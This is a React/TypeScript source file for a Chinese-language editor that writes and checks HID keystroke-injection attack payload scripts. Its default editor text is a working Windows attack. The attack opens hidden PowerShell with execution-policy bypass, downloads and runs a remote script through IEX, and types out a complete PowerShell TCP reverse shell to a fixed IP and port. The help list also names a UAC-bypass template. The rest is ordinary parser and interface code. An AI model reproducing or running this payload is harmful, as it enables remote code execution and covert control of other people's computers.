import { useState, useCallback, useMemo } from 'react';
import Editor from '@monaco-editor/react';
import {
  Play,
  Save,
  CheckCircle,
  XCircle,
  AlertTriangle,
  Copy,
  Trash2,
  FileCode,
  Terminal,
  BookOpen,
  Lightbulb,
} from 'lucide-react';
import type { DSLParseError, DSLAnalysisResult } from '@shared/types';

const defaultDSL = `# HID Attack Payload DSL Example
# Windows Reverse Shell Payload

DELAY 1000

GUI r
DELAY 500

STRING powershell -NoP -NonI -W Hidden -Exec Bypass
DELAY 200
ENTER

DELAY 3000

# Download and execute payload
STRING IEX (New-Object Net.WebClient).DownloadString('http://example.com/payload.ps1')
ENTER

# Alternative: Direct reverse shell
REM This is a comment
DELAY 500
STRING $client = New-Object System.Net.Sockets.TCPClient('192.168.1.100',4444);
ENTER
STRING $stream = $client.GetStream();
ENTER
STRING [byte[]]$bytes = 0..65535|%{0};
ENTER
STRING while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;
ENTER
STRING $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
ENTER
STRING $sendback = (iex $data 2>&1 | Out-String );
ENTER
STRING $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
ENTER
STRING $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
ENTER
STRING $stream.Write($sendbyte,0,$sendbyte.Length);
ENTER
STRING $stream.Flush();
ENTER
STRING };
ENTER
STRING $client.Close();
ENTER
`;

const syntaxExamples = [
  { command: 'DELAY', description: '延迟执行 (毫秒)', example: 'DELAY 1000' },
  { command: 'STRING', description: '输入字符串', example: 'STRING Hello World' },
  { command: 'GUI', description: '按下Win键', example: 'GUI r' },
  { command: 'ENTER', description: '按下回车键', example: 'ENTER' },
  { command: 'CTRL', description: 'Ctrl组合键', example: 'CTRL SHIFT ESC' },
  { command: 'ALT', description: 'Alt组合键', example: 'ALT F4' },
  { command: 'MOUSE_MOVE', description: '移动鼠标', example: 'MOUSE_MOVE 100 100' },
  { command: 'MOUSE_CLICK', description: '鼠标点击', example: 'MOUSE_CLICK LEFT' },
  { command: 'REPEAT', description: '重复执行', example: 'REPEAT 3' },
  { command: 'IF_OS', description: '系统条件判断', example: 'IF_OS windows' },
  { command: 'VAR', description: '定义变量', example: 'VAR DELAY 500' },
  { command: 'INCLUDE', description: '包含模板', example: 'INCLUDE bypass-uac' },
  { command: 'REM', description: '注释', example: 'REM This is a comment' },
];

function parseDSL(dsl: string): DSLAnalysisResult {
  const lines = dsl.split('\n');
  const errors: DSLParseError[] = [];
  const compiledLines: string[] = [];

  lines.forEach((line, index) => {
    const trimmed = line.trim();
    const lineNum = index + 1;

    if (!trimmed || trimmed.startsWith('#') || trimmed.startsWith('REM')) {
      compiledLines.push(`// ${trimmed}`);
      return;
    }

    const parts = trimmed.split(/\s+/);
    const command = parts[0].toUpperCase();

    switch (command) {
      case 'DELAY':
        if (parts.length !== 2) {
          errors.push({
            line: lineNum,
            column: 1,
            message: 'DELAY 需要一个数字参数 (毫秒)',
            severity: 'error',
          });
        } else if (isNaN(Number(parts[1]))) {
          errors.push({
            line: lineNum,
            column: trimmed.indexOf(parts[1]) + 1,
            message: '参数必须是数字',
            severity: 'error',
          });
        } else {
          compiledLines.push(`delay(${parts[1]});`);
        }
        break;

      case 'STRING':
        if (parts.length < 2) {
          errors.push({
            line: lineNum,
            column: 1,
            message: 'STRING 需要字符串参数',
            severity: 'error',
          });
        } else {
          const str = parts.slice(1).join(' ');
          compiledLines.push(`typeString("${str}");`);
        }
        break;

      case 'GUI':
        compiledLines.push(`pressKey(GUI${parts[1] ? `, ${parts[1].toUpperCase()}` : ''});`);
        break;

      case 'ENTER':
        compiledLines.push('pressKey(ENTER);');
        break;

      case 'CTRL':
      case 'CONTROL':
        compiledLines.push(`pressKey(CTRL${parts[1] ? `, ${parts[1].toUpperCase()}` : ''});`);
        break;

      case 'ALT':
        compiledLines.push(`pressKey(ALT${parts[1] ? `, ${parts[1].toUpperCase()}` : ''});`);
        break;

      case 'SHIFT':
        compiledLines.push(`pressKey(SHIFT${parts[1] ? `, ${parts[1].toUpperCase()}` : ''});`);
        break;

      case 'MOUSE_MOVE':
        if (parts.length !== 3) {
          errors.push({
            line: lineNum,
            column: 1,
            message: 'MOUSE_MOVE 需要 X 和 Y 坐标参数',
            severity: 'error',
          });
        } else {
          compiledLines.push(`moveMouse(${parts[1]}, ${parts[2]});`);
        }
        break;

      case 'MOUSE_CLICK':
        if (parts.length !== 2) {
          errors.push({
            line: lineNum,
            column: 1,
            message: 'MOUSE_CLICK 需要按钮参数 (LEFT/RIGHT/MIDDLE)',
            severity: 'warning',
          });
        } else {
          compiledLines.push(`clickMouse(${parts[1].toUpperCase()});`);
        }
        break;

      case 'REPEAT':
        if (parts.length !== 2) {
          errors.push({
            line: lineNum,
            column: 1,
            message: 'REPEAT 需要重复次数参数',
            severity: 'error',
          });
        } else {
          compiledLines.push(`repeat(${parts[1]}) {`);
        }
        break;

      case 'IF_OS':
        if (parts.length !== 2) {
          errors.push({
            line: lineNum,
            column: 1,
            message: 'IF_OS 需要系统参数 (windows/macos/linux)',
            severity: 'error',
          });
        } else if (!['windows', 'macos', 'linux'].includes(parts[1].toLowerCase())) {
          errors.push({
            line: lineNum,
            column: trimmed.indexOf(parts[1]) + 1,
            message: '不支持的操作系统，使用: windows, macos, linux',
            severity: 'error',
          });
        } else {
          compiledLines.push(`ifOS("${parts[1].toLowerCase()}") {`);
        }
        break;

      case 'VAR':
        if (parts.length !== 3) {
          errors.push({
            line: lineNum,
            column: 1,
            message: 'VAR 需要变量名和值参数',
            severity: 'error',
          });
        } else {
          compiledLines.push(`const ${parts[1]} = ${parts[2]};`);
        }
        break;

      case 'INCLUDE':
        if (parts.length !== 2) {
          errors.push({
            line: lineNum,
            column: 1,
            message: 'INCLUDE 需要模板名称参数',
            severity: 'error',
          });
        } else {
          compiledLines.push(`// INCLUDE: ${parts[1]}`);
        }
        break;

      default:
        errors.push({
          line: lineNum,
          column: 1,
          message: `未知命令: ${command}`,
          severity: 'error',
        });
    }
  });

  return {
    valid: errors.filter((e) => e.severity === 'error').length === 0,
    errors,
    ast: null,
    compiledPreview: compiledLines.join('\n'),
  };
}

export default function PayloadGenerator() {
  const [code, setCode] = useState(defaultDSL);
  const [showHelp, setShowHelp] = useState(false);

  const analysis = useMemo(() => parseDSL(code), [code]);

  const handleEditorChange = useCallback((value: string | undefined) => {
    if (value !== undefined) {
      setCode(value);
    }
  }, []);

  const handleCopy = useCallback(() => {
    navigator.clipboard.writeText(code);
  }, [code]);

  const handleClear = useCallback(() => {
    setCode('');
  }, []);

  const handleCopyCompiled = useCallback(() => {
    navigator.clipboard.writeText(analysis.compiledPreview);
  }, [analysis.compiledPreview]);

  const getMarkerSeverity = (severity: 'error' | 'warning') => {
    return severity === 'error' ? 8 : 4;
  };

  const markers = useMemo(() => {
    return analysis.errors.map((err) => ({
      startLineNumber: err.line,
      startColumn: err.column,
      endLineNumber: err.line,
      endColumn: err.column + 10,
      message: err.message,
      severity: getMarkerSeverity(err.severity),
    }));
  }, [analysis.errors]);

  return (
    <div className="h-full flex flex-col cyber-grid">
      <div className="flex items-center justify-between px-6 py-4 border-b border-cyber-border">
        <div className="flex items-center gap-4">
          <div className="p-2 rounded-lg bg-cyber-purple/20">
            <FileCode className="text-cyber-purple" size={24} />
          </div>
          <div>
            <h1 className="text-xl font-bold text-cyber-text neon-text-purple">
              DSL 编辑器
            </h1>
            <p className="text-cyber-muted text-sm">编写 HID 攻击载荷脚本</p>
          </div>
        </div>

        <div className="flex items-center gap-3">
          <button
            onClick={() => setShowHelp(!showHelp)}
            className="flex items-center gap-2 px-4 py-2 rounded-lg bg-cyber-surface border border-cyber-border text-cyber-text hover:border-cyber-cyan/50 transition-colors btn-cyber"
          >
            <BookOpen size={16} />
            语法帮助
          </button>
          <button
            onClick={handleClear}
            className="flex items-center gap-2 px-4 py-2 rounded-lg bg-cyber-surface border border-cyber-border text-cyber-text hover:border-cyber-red/50 hover:text-cyber-red transition-colors btn-cyber"
          >
            <Trash2 size={16} />
            清空
          </button>
          <button
            onClick={handleCopy}
            className="flex items-center gap-2 px-4 py-2 rounded-lg bg-cyber-surface border border-cyber-border text-cyber-text hover:border-cyber-cyan/50 transition-colors btn-cyber"
          >
            <Copy size={16} />
            复制
          </button>
          <button className="flex items-center gap-2 px-4 py-2 rounded-lg bg-cyber-surface border border-cyber-border text-cyber-text hover:border-cyber-green/50 transition-colors btn-cyber">
            <Save size={16} />
            保存
          </button>
          <button className="flex items-center gap-2 px-5 py-2 rounded-lg bg-cyber-purple text-white font-medium hover:bg-cyber-purple/80 transition-colors btn-cyber neon-glow-purple">
            <Play size={16} />
            模拟执行
          </button>
        </div>
      </div>

      <div className="flex-1 flex overflow-hidden">
        {showHelp && (
          <div className="w-72 border-r border-cyber-border bg-cyber-bg/50 overflow-y-auto">
            <div className="p-4">
              <h3 className="text-sm font-semibold text-cyber-text mb-3 flex items-center gap-2">
                <Lightbulb className="text-cyber-yellow" size={16} />
                语法参考
              </h3>
              <div className="space-y-2">
                {syntaxExamples.map((item) => (
                  <div
                    key={item.command}
                    className="p-2 rounded-lg bg-cyber-surface/50 border border-cyber-border/50 hover:border-cyber-purple/30 transition-colors cursor-pointer"
                  >
                    <div className="flex items-center justify-between">
                      <span className="text-sm font-mono text-cyber-cyan">{item.command}</span>
                      <button className="text-cyber-muted hover:text-cyber-green text-xs">
                        插入
                      </button>
                    </div>
                    <p className="text-xs text-cyber-muted mt-1">{item.description}</p>
                    <p className="text-xs text-cyber-text/70 mt-1 font-mono bg-cyber-bg/50 px-2 py-1 rounded">
                      {item.example}
                    </p>
                  </div>
                ))}
              </div>
            </div>
          </div>
        )}

        <div className="flex-1 flex flex-col">
          <div className="flex-1 flex min-h-0">
            <div className="w-1/2 flex flex-col border-r border-cyber-border">
              <div className="flex items-center justify-between px-4 py-2 bg-cyber-surface/30 border-b border-cyber-border">
                <div className="flex items-center gap-2">
                  <div className="w-3 h-3 rounded-full bg-cyber-purple" />
                  <span className="text-sm text-cyber-muted">DSL 脚本</span>
                </div>
                <div className="flex items-center gap-2">
                  <span className="text-xs text-cyber-muted">
                    {code.split('\n').length} 行
                  </span>
                </div>
              </div>
              <div className="flex-1">
                <Editor
                  height="100%"
                  defaultLanguage="python"
                  value={code}
                  onChange={handleEditorChange}
                  theme="vs-dark"
                  options={{
                    minimap: { enabled: true },
                    fontSize: 13,
                    fontFamily: 'Fira Code, monospace',
                    fontLigatures: true,
                    lineNumbers: 'on',
                    renderLineHighlight: 'all',
                    scrollBeyondLastLine: false,
                    automaticLayout: true,
                    tabSize: 2,
                    wordWrap: 'on',
                    padding: { top: 10, bottom: 10 },
                  }}
                />
              </div>
            </div>

            <div className="w-1/2 flex flex-col">
              <div className="flex items-center justify-between px-4 py-2 bg-cyber-surface/30 border-b border-cyber-border">
                <div className="flex items-center gap-2">
                  <div className={`w-3 h-3 rounded-full ${analysis.valid ? 'bg-cyber-green' : 'bg-cyber-red animate-pulse'}`} />
                  <span className="text-sm text-cyber-muted">编译预览</span>
                  <button
                    onClick={handleCopyCompiled}
                    className="text-cyber-muted hover:text-cyber-green"
                  >
                    <Copy size={12} />
                  </button>
                </div>
                <div className="flex items-center gap-3">
                  {analysis.valid ? (
                    <span className="text-xs text-cyber-green flex items-center gap-1">
                      <CheckCircle size={12} />
                      语法正确
                    </span>
                  ) : (
                    <span className="text-xs text-cyber-red flex items-center gap-1">
                      <XCircle size={12} />
                      存在错误
                    </span>
                  )}
                </div>
              </div>
              <div className="flex-1 overflow-auto bg-cyber-bg/80">
                <pre className="p-4 text-sm font-mono text-cyber-green/80 whitespace-pre-wrap">
                  {analysis.compiledPreview}
                </pre>
              </div>
            </div>
          </div>

          <div className="h-48 border-t border-cyber-border flex flex-col">
            <div className="flex items-center justify-between px-4 py-2 bg-cyber-surface/30 border-b border-cyber-border">
              <div className="flex items-center gap-2">
                <Terminal className="text-cyber-cyan" size={14} />
                <span className="text-sm text-cyber-muted">语法检查</span>
              </div>
              <div className="flex items-center gap-4 text-xs">
                <span className="text-cyber-red flex items-center gap-1">
                  <XCircle size={12} />
                  {analysis.errors.filter((e) => e.severity === 'error').length} 错误
                </span>
                <span className="text-cyber-yellow flex items-center gap-1">
                  <AlertTriangle size={12} />
                  {analysis.errors.filter((e) => e.severity === 'warning').length} 警告
                </span>
              </div>
            </div>
            <div className="flex-1 overflow-auto">
              {analysis.errors.length === 0 ? (
                <div className="h-full flex items-center justify-center text-cyber-muted">
                  <CheckCircle className="text-cyber-green mr-2" size={20} />
                  未发现语法错误
                </div>
              ) : (
                <div className="divide-y divide-cyber-border/50">
                  {analysis.errors.map((err, index) => (
                    <div
                      key={index}
                      className={`flex items-start gap-3 px-4 py-2 hover:bg-cyber-surface/30 cursor-pointer ${
                        err.severity === 'error' ? 'bg-cyber-red/5' : 'bg-cyber-yellow/5'
                      }`}
                    >
                      <div
                        className={`mt-0.5 p-1 rounded ${
                          err.severity === 'error' ? 'bg-cyber-red/20' : 'bg-cyber-yellow/20'
                        }`}
                      >
                        {err.severity === 'error' ? (
                          <XCircle className="text-cyber-red" size={12} />
                        ) : (
                          <AlertTriangle className="text-cyber-yellow" size={12} />
                        )}
                      </div>
                      <div className="flex-1">
                        <p className="text-sm text-cyber-text">{err.message}</p>
                        <p className="text-xs text-cyber-muted mt-0.5">
                          第 {err.line} 行, 第 {err.column} 列
                        </p>
                      </div>
                      <button className="text-cyber-muted hover:text-cyber-purple text-xs">
                        跳转
                      </button>
                    </div>
                  ))}
                </div>
              )}
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}
